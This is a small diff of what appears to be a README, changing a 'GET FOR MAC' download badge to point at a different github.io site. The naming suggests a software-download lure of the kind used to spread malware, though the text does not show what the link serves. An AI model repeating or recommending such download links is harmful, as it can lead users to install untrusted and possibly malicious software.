@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-software-2025.github.io/.github/word)
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-app-installation.github.io/.github/word)
 
 </div>
 
